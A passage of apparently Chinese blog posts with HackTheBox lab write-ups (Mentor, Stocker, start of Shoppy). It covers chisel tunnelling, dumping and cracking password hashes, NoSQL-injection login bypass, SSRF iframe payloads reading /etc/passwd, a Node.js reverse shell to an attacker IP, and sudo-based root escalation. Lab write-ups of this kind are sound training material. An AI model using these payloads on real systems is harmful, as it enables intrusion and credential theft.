    <span class="token string">"quotes"</span><span class="token punctuation">,</span>
    metadata<span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">,</span> String<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"description"</span><span class="token punctuation">,</span> String<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"created_date"</span><span class="token punctuation">,</span> DateTime<span class="token punctuation">,</span> default<span class="token operator">=</span>func<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span>

<span class="token comment"># SQLAlchemy for users</span>
engine <span class="token operator">=</span> create_engine<span class="token punctuation">(</span>DATABASE_URL<span class="token punctuation">)</span>
metadata <span class="token operator">=</span> MetaData<span class="token punctuation">(</span><span class="token punctuation">)</span>
users <span class="token operator">=</span> Table<span class="token punctuation">(</span>
    <span class="token string">"users"</span><span class="token punctuation">,</span>
    metadata<span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">,</span> Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"email"</span><span class="token punctuation">,</span> String<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> String<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    Column<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> String<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">,</span>nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span>

<span class="token comment"># Databases query builder</span>
database <span class="token operator">=</span> Database<span class="token punctuation">(</span>DATABASE_URL<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>为了与PostgreSQL数据库交互，需要用到<code>chisel</code>工具</p>
<p>chisel工具：<a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p>
<p>从本地传一个chisel</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">本地：python3 -m http.server 80
靶机：wget http://[本地IP]/chisel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>（PS：这里看到靶机IP为10.129.89.191，与之前的10.10.11.193不一致，是因为靶机中间网络中断，我切换过靶机环境，本质上他俩都是这台靶机地址）</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230312130938191.png"></p>
<p>将chisel复制到<code>/tmp</code>文件夹下，并添加可执行权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309164015713.png"></p>
<p>本地执行：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chmod +x chisel
./chisel server --port 9899 --reverse<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>靶机执行：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chmod +x chisel
./chisel client -v 10.10.X.X:9899 R:5432:172.22.0.1:5432<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309164938550.png"></p>
<p>连接数据库，密码是<code>postgres</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# psql -h 10.10.X.X -U "postgres" -p 5432
Password for user postgres: 
psql (13.2 (Debian 13.2-1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

postgres=# \list
                                    List of databases
      Name       |  Owner   | Encoding |  Collate   |   Ctype    |   Access privileges   
-----------------+----------+----------+------------+------------+-----------------------
 mentorquotes_db | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 postgres        | postgres | UTF8     | en_US.utf8 | en_US.utf8 | 
 template0       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
                 |          |          |            |            | postgres=CTc/postgres
 template1       | postgres | UTF8     | en_US.utf8 | en_US.utf8 | =c/postgres          +
                 |          |          |            |            | postgres=CTc/postgres
(4 rows)

postgres=# \c mentorquotes_db 
psql (13.2 (Debian 13.2-1), server 13.7 (Debian 13.7-1.pgdg110+1))
You are now connected to database "mentorquotes_db" as user "postgres".
mentorquotes_db=# \d
              List of relations
 Schema |     Name      |   Type   |  Owner   
--------+---------------+----------+----------
 public | cmd_exec      | table    | postgres
 public | quotes        | table    | postgres
 public | quotes_id_seq | sequence | postgres
 public | users         | table    | postgres
 public | users_id_seq  | sequence | postgres
(5 rows)

mentorquotes_db=# select * from users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
  4 | wa0er@mentorquotes.htb | james       | ad4ece449e52f57769466a281720b825
  5 | james@mentorquotes.htb | wa0er       | ad4ece449e52f57769466a281720b825
  6 | admin@mentorquotes.htb | admin       | ad4ece449e52f57769466a281720b825
(5 rows)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>获取到用户密码hash值，只有前两个有用，后面的是之前自己添加的</p>
<p>破解一下<a href="https://crackstation.net/">https://crackstation.net/</a></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309165816876.png"></p>
<p>得到svc账户的密码</p>
<pre class="line-numbers language-none"><code class="language-none">123meunomeeivani<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>登录ssh</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# ssh svc@10.10.11.193
svc@10.10.11.193's password: 
Welcome to Ubuntu 22.04.1 LTS (GNU/Linux 5.15.0-56-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Mar  9 09:03:14 AM UTC 2023

  System load:                      0.0
  Usage of /:                       65.3% of 8.09GB
  Memory usage:                     15%
  Swap usage:                       0%
  Processes:                        243
  Users logged in:                  0
  IPv4 address for br-028c7a43f929: 172.20.0.1
  IPv4 address for br-24ddaa1f3b47: 172.19.0.1
  IPv4 address for br-3d63c18e314d: 172.21.0.1
  IPv4 address for br-7d5c72654da7: 172.22.0.1
  IPv4 address for br-a8a89c3bf6ff: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.193
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:d789


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Dec 12 10:22:58 2022 from 10.10.14.40
svc@mentor:~$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
svc@mentor:~$ pwd
/home/svc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="四、权限提升"><a href="#四、权限提升" class="headerlink" title="四、权限提升"></a>四、权限提升</h2><p>从本地传一个<code>linpeas</code>工具，运行一下，分析可看到有SNMP服务的相关配置文件</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309172001148.png"></p>
<p>查看<code>/etc/snmp/snmpd.conf</code>，可看到有个密码，站点属主是james，那应该就是james的密码（这个密码跟之前的密码不一样，可能前面的那个只是平台james管理员的密码，这个地方是linux终端james用户的密码）</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">svc@mentor:/tmp$ cat /etc/snmp/snmpd.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230309172447153.png"></p>
<pre class="line-numbers language-none"><code class="language-none">SuperSecurePassword123__<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>切换到james用户，执行<code>sudo -l</code>可看到james用户有执行<code>/bin/sh</code>命令的权限</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">svc@mentor:/tmp$ su james
Password: 
james@mentor:/tmp$ id
uid=1000(james) gid=1000(james) groups=1000(james)
james@mentor:/tmp$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>执行<code>/bin/sh</code>，成功获取root权限</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">james@mentor:/tmp$ sudo /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>Over！</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230310104724341.png" style="zoom: 67%;">

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>Hackthebox Mentor Writeup：<a href="https://0xdedinfosec.vercel.app/blog/hackthebox-mentor-writeup">https://0xdedinfosec.vercel.app/blog/hackthebox-mentor-writeup</a></p>
<p>实战SNMP服务攻击：<a href="https://www.freebuf.com/articles/network/319234.html">https://www.freebuf.com/articles/network/319234.html</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Swagger UI</tag>
        <tag>SNMP</tag>
        <tag>JWT命令执行</tag>
        <tag>PostgreSQL数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Stocker</title>
    <url>/posts/77989ccd.html</url>
    <content><![CDATA[<h1 id="HTB-Stocker"><a href="#HTB-Stocker" class="headerlink" title="HTB-Stocker"></a>HTB-Stocker</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><ol>
<li><p>信息收集发现登录点，尝试发现登录点存在NoSQL注入；</p>
</li>
<li><p>NoSQL注入绕过登录验证；</p>
</li>
<li><p>提交购物信息发现有PDF存在SSRF；</p>
</li>
<li><p>SSRF读取敏感文件发现SSH用户；</p>
</li>
<li><p><code>sudo -l</code>发现SSH用户有执行文件权限；</p>
</li>
<li><p>执行文件反弹shell，获取root权限。</p>
</li>
</ol>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/桌面]
└─# nmap -sC -sV -oA stocker 10.10.11.196
Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-06 22:42 EST
Nmap scan report for stocker.htb (10.10.11.196)
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3d:12:97:1d:86:bc:16:16:83:60:8f:4f:06:e6:d5:4e (RSA)
|   256 7c:4d:1a:78:68:ce:12:00:df:49:10:37:f9:ad:17:4f (ECDSA)
|_  256 dd:97:80:50:a5:ba:cd:7d:55:e8:27:ed:28:fd:aa:3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-generator: Eleventy v2.0.0
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Stock - Coming Soon!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.11 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>开放端口：22（ssh）、80（http），域名：<code>stocker.htb</code></p>
<p>添加域名到本地hosts文件</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/桌面]
└─# echo "10.10.11.196 stocker.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>访问stocker.htb（<strong>注：</strong>若kali科学上网方案采用的是通过proxychains代理到物理机，则此处用proxychains打开的firefox来访问stocker.htb会打不开。因为此时HTTP请求流量会被代理到物理机，而不走HTB官方给的VPN通道。至于为什么代理到物理机就打不开，相关具体细节可以通过Wireshark结合计算机网络知识分析）</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230207115217110.png"></p>
<p>用<code>gobuster</code>爆一下子域名</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://stocker.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/03/14 21:37:39 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--&gt; /login]
Progress: 4968 / 4990 (99.56%)
===============================================================
2023/03/14 21:38:08 Finished
===============================================================<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>有个<code>dev.stocker.htb</code>子域，302重定向到<code>/login</code>目录，同样添加到hosts文件</p>
<pre class="line-numbers language-none"><code class="language-none">┌──(root💀kali)-[~/桌面]
└─# echo "10.10.11.196 dev.stocker.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>访问，确实是个登录页面</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315094312360.png" style="zoom:67%;">

<p>用Wappalyzer插件看到网站是Nodejs写的</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315161915203.png" style="zoom: 67%;">

<h2 id="三、NoSQL注入"><a href="#三、NoSQL注入" class="headerlink" title="三、NoSQL注入"></a>三、NoSQL注入</h2><p>NoSQL：<a href="https://www.mongodb.com/zh-cn/nosql-explained">https://www.mongodb.com/zh-cn/nosql-explained</a></p>
<p>一般而言，NoSQL数据库是对非关系型数据库的统称，是个广义概念。常见NoSQL数据库，如MongoDB（文档数据库）、Redis（键值数据库）、Cassandra（宽列存储数据库）、JanusGraph（图形数据库）等。</p>
<p>随便输入一组用户名密码登录，并用Burp抓包，重放</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315094816337.png"></p>
<p>返回登录失败的报错</p>
<p>修改<code>Content-Type</code>值为<code>application/json</code>，修改请求包数据部分如下</p>
<pre class="line-numbers language-none"><code class="language-none">{"username":{"$ne":"admin"}, "password":{"$ne":"admin"}}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315095429644.png"></p>
<p>可看到302重定向到<code>/stock</code>目录，浏览器打开此目录，发现成功登录</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315095836862.png" style="zoom:80%;">

<h2 id="四、SSRF"><a href="#四、SSRF" class="headerlink" title="四、SSRF"></a>四、SSRF</h2><p>页面下拉，随便选一个商品，此处选了一个杯子，添加到购物车，然后查看购物车，点击提交购买，同时用Burp抓取请求包</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315102659311.png" style="zoom:67%;">

<p>可看到当前目录是在<code>/api/order</code>，Burp重放请求包之后，可看到返回一个<code>orderId</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315102734894.png"></p>
<p>回到浏览器，取消Burp代理抓包，有如下弹窗，点击here跳转</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315103236801.png"></p>
<p>发现页面跳转到<code>/api/po/[OrderID]</code>，是个PDF</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315202031022.png"></p>
<p>在尝试后，发现修改title字段值，页面中的Item条目会相应变成title字段值（每次在Burp修改title字段值，然后重放请求包后，把返回的OrderID值复制粘贴到URL栏末尾即可访问）</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315202202143.png"></p>
<p>参考</p>
<p><a href="https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file">https://www.triskelelabs.com/blog/extracting-your-aws-access-keys-through-a-pdf-file</a></p>
<p><a href="https://techkranti.com/ssrf-aws-metadata-leakage/">https://techkranti.com/ssrf-aws-metadata-leakage/</a></p>
<p>于是修改title字段值如下，尝试读取<code>etc/passwd</code>文件</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;iframe src=/etc/passwd&gt;&lt;/iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315102941535.png"></p>
<p>Item条目显示出<code>/etc/passwd</code>内容，但不是很全</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315103324426.png"></p>
<p>那就尝试把宽高设大一些，再次读取，发现能看到的部分就多了</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;iframe src=/etc/passwd height=500 width=500&gt;&lt;/iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315104739794.png"></p>
<p>读取nginx默认配置</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;iframe src=file:///etc/nginx/nginx.conf height=1100px width=1100px&lt;/iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>发现网站根目录在<code>/var/www/dev</code>，那就尝试读取<code>index.js</code>配置文件</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;iframe src=file:///var/www/dev/index.js height=1000px width=1000px&gt;&lt;/iframe&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315105404295.png"></p>
<p>通过前面/etc/passwd，知道有两个普通用户，mongdb和angoose，配置文件中有一个疑似密码的字符串</p>
<p>尝试之后，发现SSH用户密码如下</p>
<pre class="line-numbers language-none"><code class="language-none">Angoose
IHeardPassphrasesArePrettySecure<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">┌──(root💀kali)-[~/Desktop]
└─# ssh angoose@10.10.11.196
The authenticity of host '10.10.11.196 (10.10.11.196)' can't be established.
ECDSA key fingerprint is SHA256:DX/9+PB1w20dghcXwm9QPFH88qM0aiPr+RyA+wzHnng.
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '10.10.11.196' (ECDSA) to the list of known hosts.
angoose@10.10.11.196's password: 
Last login: Tue Mar 14 22:45:53 2023 from 10.10.14.187
angoose@stocker:~$ id
uid=1001(angoose) gid=1001(angoose) groups=1001(angoose)
angoose@stocker:~$ pwd
/home/angoose<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="五、权限提升"><a href="#五、权限提升" class="headerlink" title="五、权限提升"></a>五、权限提升</h2><p><code>sudo -l</code>查看angoose用户权限</p>
<pre class="line-numbers language-none"><code class="language-none">angoose@stocker:~$ sudo -l
[sudo] password for angoose: 
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>发现angoose用户可执行<code>/usr/bin/node /usr/local/scripts/*.js</code></p>
<p>那我们就尝试在<code>/usr/local/scripts</code>目录下写一个js文件，但发现在此目录无可写权限，那就依然在angoose用户的home目录下写<code>wa0er_rev.js</code>，内容是反弹shell，如下</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">angoose@stocker:~$ vi wa0er_rev.js
require('child_process').exec("bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.x.x/9898 0&gt;&amp;1'")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>开启nc监听</p>
<pre class="line-numbers language-none"><code class="language-none">nc -nvlp 9898<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>执行，刚刚的反弹shell文件</p>
<pre class="line-numbers language-none"><code class="language-none">angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/wa0er_rev.js 
[sudo] password for angoose: <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>成功获取root权限</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315112610819.png"></p>
<p>Over！</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230315112846605.png" style="zoom: 67%;">

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>HackTheBox Stocker：<a href="https://infosecwriteups.com/stocker-hackthebox-machine-simple-writeup-2023-316497ed30f7">https://infosecwriteups.com/stocker-hackthebox-machine-simple-writeup-2023-316497ed30f7</a></p>
<p>HackTheBox Stocker：<a href="https://blog.csdn.net/qq_45894840/article/details/128765294">https://blog.csdn.net/qq_45894840/article/details/128765294</a></p>
]]></content>
      <categories>
        <category>靶机</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
        <tag>NoSQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Shoppy</title>
    <url>/posts/9681db2a.html</url>
    <content><![CDATA[<h1 id="HTB-Shoppy"><a href="#HTB-Shoppy" class="headerlink" title="HTB-Shoppy"></a>HTB-Shoppy</h1><h2 id="一、思路概要"><a href="#一、思路概要" class="headerlink" title="一、思路概要"></a>一、思路概要</h2><ol>
<li><p>信息收集目录枚举得到<code>/login</code>页面；</p>
</li>
<li><p>万能密码登录<code>/login</code>页面；</p>
</li>
<li><p>再次万能密码拿到<code>josh</code>账户（非ssh账户）；</p>
</li>
<li><p>枚举子域得到<code>mattermost</code>子域；</p>
</li>
<li><p><code>josh</code>账户登录<code>mattermost</code>子域并分析页面拿到ssh账户；</p>
</li>
<li><p>连上ssh账户<code>sudo -l</code>发现可执行文件；</p>
</li>
<li><p>逆向分析可执行文件拿到<code>deploy</code>账户；</p>
</li>
<li><p>docker提权获取root权限。</p>
</li>
</ol>
<h2 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h2><p>nmap（用如下两步，先扫全端口，再指定端口定向扫描服务、版本相关信息，有助于提升扫描速度）</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# nmap -p- --min-rate 10000 10.129.92.247
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-31 04:15 EDT
Nmap scan report for 10.129.92.247
Host is up (0.33s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9093/tcp open  copycat

Nmap done: 1 IP address (1 host up) scanned in 9.05 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">┌──(root💀kali)-[~/Desktop]
└─# nmap -p 22,80,9093 -sCV 10.129.92.247
Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-31 04:24 EDT
Nmap scan report for 10.129.92.247
Host is up (0.32s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp   open  http     nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
9093/tcp open  copycat?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Fri, 31 Mar 2023 08:24:50 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 15
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 15
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 2.8824e-05
|     go_gc_duration_seconds{quantile="0.25"} 7.6212e-05
|     go_gc_d
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Fri, 31 Mar 2023 08:24:51 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 15
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 15
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 2.8824e-05
|     go_gc_duration_seconds{quantile="0.25"} 7.6212e-05
|_    go_gc_d
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9093-TCP:V=7.91%I=7%D=3/31%Time=642698D4%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,152D,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/plain;\x20version=0\.0\.4;\x20charset=utf-8\r\nDate:\x20Fri,\x2
SF:031\x20Mar\x202023\x2008:24:50\x20GMT\r\n\r\n#\x20HELP\x20go_gc_cycles_
